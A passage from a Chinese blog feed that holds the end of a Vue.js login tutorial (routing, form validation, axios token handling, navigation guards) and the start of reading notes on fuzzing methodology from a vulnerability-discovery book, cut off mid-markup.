attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css文件位置<span class="token punctuation">"</span></span> <span class="token attr-name">scoped</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><blockquote><p>scoped只对当前域有效，除index.html的文件外，.vue文件生成的html文件并没有body，所以不会对body节点生效</p></blockquote><h5 id="2-路由规则"><a href="#2-路由规则" class="headerlink" title="2. 路由规则"></a>2. 路由规则</h5><p>打开router-&gt;index.js文件，写入路由规则</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token keyword">import</span> Login <span class="token keyword">from</span> <span class="token string">'../components/Login.vue'</span> Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">)</span><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> path<span class="token punctuation">:</span><span class="token string">'/'</span><span class="token punctuation">,</span> redirect<span class="token punctuation">:</span> Login<span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//重定向，用户访问/时重定向至Login组件</span>    <span class="token punctuation">{</span> path<span class="token punctuation">:</span> <span class="token string">'/login'</span><span class="token punctuation">,</span>component<span class="token punctuation">:</span> Login<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//当用户访问/login时，展示Login组件 </span><span class="token punctuation">]</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  routes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> router</code></pre><h5 id="5-在根组件中放路由占位符"><a href="#5-在根组件中放路由占位符" class="headerlink" title="5. 在根组件中放路由占位符"></a>5. 在根组件中放路由占位符</h5><p>在App.vue文件中添加占位符</p><pre class=" language-vue"><code class="language-vue"><template>    <router-view></router-view> <!--通过路由匹配到的组件都会被渲染到此处--></template><script>    export default {        name:'app'    }</script><style></style></code></pre><p><img src="https://pic.downk.cc/item/5ff2c3903ffa7d37b301dcfd.png" alt=""></p><h3 id="表单数据绑定"><a href="#表单数据绑定" class="headerlink" title="表单数据绑定"></a>表单数据绑定</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">:model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm.username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--用户名--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm.password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--密码--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//登录表单绑定的数据对象</span>        loginForm<span class="token punctuation">:</span><span class="token punctuation">{</span>username<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span> password<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><blockquote><p>v-model通常用于input的双向数据绑定，也可以实现子组件到父组件数据的双向数据绑定</p><p>:model是v-bind:model的缩写,这种只是将父组件的数据传递到了子组件，并没有实现子组件和父组件数据的双向绑定。当然引用类型除外，子组件改变引用类型的数据的话，父组件也会改变的。</p></blockquote><h4 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">:model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm<span class="token punctuation">"</span></span> <span class="token attr-name">:rules</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginRules<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span> <span class="token attr-name">prop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm.username<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--用户名--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span> <span class="token attr-name">prop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密码    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loginForm.password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--密码--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//登录表单绑定的数据对象</span>        loginForm<span class="token punctuation">:</span><span class="token punctuation">{</span>username<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span> password<span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//rules对象中的每一个数组就是一个验证对象，数组里的每一条记录对应验证对象的一条规则 </span>        loginRules<span class="token punctuation">:</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//验证用户名是否合法</span>            username<span class="token punctuation">:</span><span class="token punctuation">[</span>            <span class="token comment" spellcheck="true">//规则①：required为true时代表必填项，message为不符合规则时显示的内容，blur指定鼠标失去焦点时触发验证行为</span>            <span class="token punctuation">{</span>required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> message<span class="token punctuation">:</span> <span class="token string">'请输入用户名'</span><span class="token punctuation">,</span> trigger<span class="token punctuation">:</span> <span class="token string">'blur'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//规则②：规定用户名长度</span>            <span class="token punctuation">{</span>min<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> max<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> message<span class="token punctuation">:</span> <span class="token string">'长度为3-5个字符'</span><span class="token punctuation">,</span> trriger<span class="token punctuation">:</span><span class="token string">'blur'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//验证密码是否合法</span>        password<span class="token punctuation">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token punctuation">]</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h4 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h4><p>表单的引用</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-form</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ruleForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-form</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--ref属性值为表单的引用--></span></code></pre><p>为登录按钮绑定事件</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span>  <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">></span></span></code></pre><h3 id="利用axios发起登录请求"><a href="#利用axios发起登录请求" class="headerlink" title="利用axios发起登录请求"></a>利用axios发起登录请求</h3><h4 id="配置axios"><a href="#配置axios" class="headerlink" title="配置axios"></a>配置axios</h4><h5 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h5><p>全局配置</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span>axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>baseURL <span class="token operator">=</span> <span class="token string">'http://localhost:3000'</span> <span class="token comment" spellcheck="true">//配置请求的根路径</span>Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$http <span class="token operator">=</span> axios  <span class="token comment" spellcheck="true">//每一个vue组件都可以通过this.$http发起请求</span></code></pre><h5 id="登录事件的函数处理"><a href="#登录事件的函数处理" class="headerlink" title="登录事件的函数处理()"></a>登录事件的函数处理()</h5><pre class=" language-js"><code class="language-js">  <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>ruleForm<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token keyword">async</span> valid <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>             <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$http<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>ruleForm<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//first为请求地址，this.ruleForm为表单绑定数据(username,password)，请求参数可直接写json也可使用对象</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><h5 id="存储token"><a href="#存储token" class="headerlink" title="存储token"></a>存储token</h5><pre class=" language-js"><code class="language-js"> window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存储token</span></code></pre><p>存储的token可在浏览器控制台application-&gt;sessionStorage查看</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="组件之间跳转"><a href="#组件之间跳转" class="headerlink" title="组件之间跳转"></a>组件之间跳转</h3><h3 id="router-link渲染"><a href="#router-link渲染" class="headerlink" title="router-link渲染"></a>router-link渲染</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">:to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{path: <span class="token punctuation">'</span>/login<span class="token punctuation">'</span>}<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--router-link默认渲染为带有正确链接的a标签，此处为渲染到/login路由所指向的组件--></span></code></pre><h3 id="点击事件触发-带参数"><a href="#点击事件触发-带参数" class="headerlink" title="点击事件触发(带参数)"></a>点击事件触发(带参数)</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>goLogin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>        methods<span class="token punctuation">:</span><span class="token punctuation">{</span>            goLogin<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token punctuation">:</span> <span class="token string">'/login'</span><span class="token punctuation">,</span>query<span class="token punctuation">:</span><span class="token punctuation">{</span>id<span class="token punctuation">:</span>id<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//跳转到/login路由所指的路由,query传递参数,会暴露在url中</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h5 id="接收参数"><a href="#接收参数" class="headerlink" title="接收参数"></a>接收参数</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id</code></pre><h3 id="路由导航守卫控制访问权限"><a href="#路由导航守卫控制访问权限" class="headerlink" title="路由导航守卫控制访问权限"></a>路由导航守卫控制访问权限</h3><p>如果用户没有登录，但是直接通过url访问特定页面，需要重新导航到登录页面。</p><p><strong>router/index.js</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//挂载路由导航守卫</span>router<span class="token punctuation">.</span><span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span><span class="token keyword">from</span><span class="token punctuation">,</span>next<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//to表示将要访问的路径</span>    <span class="token comment" spellcheck="true">//from 代表从哪个路径跳转而来</span>    <span class="token comment" spellcheck="true">//next 是一个函数，表示放行</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">'/test'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>path <span class="token operator">==</span><span class="token string">'/customer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//如果访问login /直接放行</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">const</span> tokenStr <span class="token operator">=</span> window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取token</span>            <span class="token comment" spellcheck="true">// console.log("token",tokenStr);</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>tokenStr<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//强制跳转/login页</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h3><p>退出只需销毁本地的token即可</p><pre class=" language-js"><code class="language-js">window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//清空token</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token punctuation">:</span><span class="token string">'/login'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//回到登录页</span></code></pre><h2 id="登录后获取数据"><a href="#登录后获取数据" class="headerlink" title="登录后获取数据"></a>登录后获取数据</h2><p>后端设计所有请求头必须使用 <font color=orange>Authorization</font> 字段提供的 <font color=orange>token</font> 令牌</p><h3 id="通过接口获取数据"><a href="#通过接口获取数据" class="headerlink" title="通过接口获取数据"></a>通过接口获取数据</h3><p>通过axios请求拦截器添加token，保证拥有获取数据的权限。</p><h4 id="main-js-1"><a href="#main-js-1" class="headerlink" title="main.js"></a>main.js</h4><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//config为请求对象</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>config<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    config<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>Authorization <span class="token operator">=</span> window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> config  <span class="token comment" spellcheck="true">//固定写法</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h3><p>在axios配置为$http的情况下（参考上文）</p><pre class=" language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$http<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'logout'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>username<span class="token punctuation">:</span><span class="token string">'zby'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//(路由,消息体)</span></code></pre><h5 id="后端获取数据"><a href="#后端获取数据" class="headerlink" title="后端获取数据"></a>后端获取数据</h5><p>python</p><pre class=" language-python"><code class="language-python">body <span class="token operator">=</span> str<span class="token punctuation">(</span>request<span class="token punctuation">.</span>body<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>bodyJson <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>  <span class="token operator">//</span>要对body进行非空处理，否则会出错username <span class="token operator">=</span> bodyJson<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing1</title>
      <link href="/2020/12/15/fuzzing1/"/>
      <url>/2020/12/15/fuzzing1/</url>
      
        <content type="html"><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><p>本系列博客是博主对《模糊测试：强制发掘安全漏洞的利器》（Fuzzing:Brute Force Vulnerability Discovery）所做的读书笔记。</p><h1 id="安全漏洞发现方法"><a href="#安全漏洞发现方法" class="headerlink" title="安全漏洞发现方法"></a>安全漏洞发现方法</h1><p>安全漏洞的发现方法可以分为以下几种：</p><ul><li>白盒测试：对源代码进行分析</li><li>黑盒测试：仅通过外部观测来测试系统，只需要测试者能够进行输入和观测输出就可进行</li><li>灰盒测试：介于黑盒测试和白盒测试之间，通过对二进制文件进行逆向工程获得比黑盒分析更多的信息</li></ul><h1 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>通过向应用提供非预期的输入并监控输出中的异常来发现软件中的故障的方法。模糊测试利用自动化或非自动化的方法重复地向应用提供输入。</p><h3 id="模糊测试器-fuzzer"><a href="#模糊测试器-fuzzer" class="headerlink" title="模糊测试器(fuzzer)"></a>模糊测试器(fuzzer)</h3><p>用于模糊测试的模糊测试器分为两类：</p><ul><li>基于变异的模糊测试器(mutation-based fuzzer):对已有的数据样本进行变异来创建测试用例</li><li>基于生成的模糊测试器(generation-based fuzzer):该类测试器为被测系统使用的协议或是文件格式建模，基于模型生成输入并据此创建测试用例</li></ul><h3 id="模糊测试各阶段"><a href="#模糊测试各阶段" class="headerlink" title="模糊测试各阶段"></a>模糊测试各阶段</h3><h4 id="1、确定测试目标"><a href="#1、确定测试目标" class="headerlink" title="1、确定测试目标"></a>1、确定测试目标</h4><p>如果要决定第三方应用模糊测试的测试目标，首先需要参考第三方应用的供应商历史上曾出现过的安全漏洞。除应用程序外，应用包含的特定文件或库也可以是测试目标(优先测试多个应用程序之间共享的二进制代码，因为这些代码影响的用户更多，风险更大)</p><h4 id="2、确定输入向量-input-vector"><a href="#2、确定输入向量-input-vector" class="headerlink" title="2、确定输入向量(input vector)"></a>2、确定输入向量(input vector)</h4><p>几乎所有可被利用的安全漏洞都是因为应用没有对用户的输入进行校验或是进行必要的非法输入处理。是否能找到所有的输入向量是模糊测试能否成功的关键。寻找输入向量的原则是：从客户端向目标应用发送的任何东西，包括头headers,文件名file name，环境变量environment variables，注册表键registry key，以及其他信息，都应该被看作是输入向量。</p><h4 id="3、生成模糊测试数据"><a href="#3、生成模糊测试数据" class="headerlink" title="3、生成模糊测试数据"></a>3、生成模糊测试数据</h4><p>使用自动化过程来生成数据</p><h4 id="4、执行模糊测试数据"><a href="#4、执行模糊测试数据" class="headerlink" title="4、执行模糊测试数据"></a>4、执行模糊测试数据</h4><p>在该步骤中，一般会向被测目标发送数据包、打开文件或是执行被测应用，同3，这个步骤必须是自动化的</p><h4 id="5、监视异常"><a href="#5、监视异常" class="headerlink" title="5、监视异常"></a>5、监视异常</h4><p>模糊测试需要根据被测应用和所决定采用的模糊测试类型来设置各种形式的监视。</p><h4 id="6、判定被发现的漏洞是否可被利用"><a href="#6、判定被发现的漏洞是否可被利用" class="headerlink" title="6、判定被发现的漏洞是否可被利用"></a>6、判定被发现的漏洞是否可被利用</h4><p>如果在模糊测试过程中发现了一个错误，依据审计的目的，可能需要判定这个给被发现的错误是否是一个可被利用的安全漏洞，这种判定过程是典型的手工过程。</p><h3 id="模糊测试的局限性"><a href="#模糊测试的局限性" class="headerlink" title="模糊测试的局限性"></a>模糊测试的局限性</h3><p>模糊测试适用于找到特定被测系统中的特定弱点，因此，模糊测试能够发现的安全漏洞也是有一定局限性的。以下是模糊测试器难以发现的典型安全性漏洞：</p><h4 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h4><p>模糊测试器并不理解程序逻辑，它并不知道普通用户并不能访问管理员区域。</p><h4 id="糟糕的设计逻辑"><a href="#糟糕的设计逻辑" class="headerlink" title="糟糕的设计逻辑"></a>糟糕的设计逻辑</h4><p>模糊测试器不适合发现程序中的设计缺陷</p><h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>如果一个模糊测试器对被测应用的结构只有很少的了解，后门看上去与其他正常的逻辑没有什么不同。比如在对口令域进行模糊测试时，如果某个输入导致应用发生崩溃，这种漏洞通常可以被发现；但一个通过随机猜测可以被发现的，能进入系统的硬编码口令就不会被发现</p><h4 id="破坏"><a href="#破坏" class="headerlink" title="破坏"></a>破坏</h4><p>内存破坏问题通常会导致被测应用的崩溃，这类问题可以根据与拒绝服务攻击类似的情况来加以识别。然而，有些内存错误问题会被被测应用所掩盖，因此简单的模糊测试器永远都发现不了这类问题。</p><h4 id="多阶段漏洞-MuliStage-Vulnerability"><a href="#多阶段漏洞-MuliStage-Vulnerability" class="headerlink" title="多阶段漏洞(MuliStage Vulnerability)"></a>多阶段漏洞(MuliStage Vulnerability)</h4><p>模糊测试对识别单独的漏洞很有用，但通常而言，模糊测试对那些小的漏洞链构成的漏洞或是让人不感兴趣的事件构成的多向量攻击的识别作用不大。</p><h2 id="模糊测试方法"><a href="#模糊测试方法" class="headerlink" title="模糊测试方法"></a>模糊测试方法</h2><p>模糊测试方法分为五大类：</p><h3 id="1、预生成测试用例"><a href="#1、预生成测试用例" class="headerlink" title="1、预生成测试用例"></a>1、预生成测试用例</h3><p>该方法要求研究特定的规约，理解该规约支持的数据结构和可接受的值的范围，然后依据这些理解生成用于测似乎边界条件或是违反规约 的测试用例。</p><ul><li>优点：用例一旦被创建，很容易被复用，用于测试某种协议或文件格式的不同实现</li><li>缺点：缺乏随机生成，一旦测试用例列表中的用例被执行完，测试就只能结束</li></ul><h3 id="2、随机生成输入"><a href="#2、随机生成输入" class="headerlink" title="2、随机生成输入"></a>2、随机生成输入</h3><p>随机方法简单地向目标应用发送伪随机数据，查看结果输出。</p><ul><li>优点：快速识别目标应用中是否有非常糟糕的代码</li><li>缺点：低效、很难找到导致系统崩溃的数据</li></ul><h3 id="3、手工协议变异测试"><a href="#3、手工协议变异测试" class="headerlink" title="3、手工协议变异测试"></a>3、手工协议变异测试</h3><p>在此种测试方法中，在加载了目标应用后，测试者仅仅通过输入不正确的数据，试图使服务器崩溃，或是诱发一些不正常行为。</p><ul><li>优点：分析中能够在安全审计中充分发挥自己的经验</li><li>缺点：较初级</li></ul><h3 id="4、变异或强制性测试"><a href="#4、变异或强制性测试" class="headerlink" title="4、变异或强制性测试"></a>4、变异或强制性测试</h3><p>指模糊测试器从一个有效的协议样本或是数据格式样本开始，持续不断的打乱数据包或是文件中的每一个字节、字、双字或是字符串。</p><ul><li>优点：整个强制性模糊测试的过程都可以完全自动化</li><li>缺点：低效，因为许多CPU的周期会被浪费在生成完全不可解析的数据上</li></ul><h3 id="5、自动协议生成测试"><a href="#5、自动协议生成测试" class="headerlink" 